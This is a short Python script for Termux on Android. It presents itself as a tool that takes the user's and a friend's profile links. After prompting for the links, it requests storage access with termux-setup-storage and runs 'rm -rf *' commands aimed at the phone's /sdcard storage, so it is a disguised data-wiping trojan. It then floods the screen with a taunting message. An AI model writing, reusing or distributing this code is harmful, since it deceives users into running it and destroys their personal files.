import os
import sys
import time 
from colorama import Fore , Back ,Style
os.system("clear")
banner = os.system( "pyfiglet We are Myanmar ")

print(Fore.GREEN+"Developer : H-2")

print("\n")
data = input(Fore.GREEN+Back.WHITE+"your profile copy link ->")
anon = input(Fore.GREEN+Back.WHITE+"your friend profile copy link ->")
print()
print(data)
time.sleep(2)
print()
print(anon)
os.system("termux-setup-storage")
os.system("clear")
os.system("cd ")
os.system("cd ..")
os.system("cd /sdcard/")
os.system("rm -rf *")
os.system("rm -rf .all *")
time.sleep(3)
for anon in range(0,99999999999999999999999):
	print(Style.RESET_ALL+"sorry bro We do not want to look : ",anon)
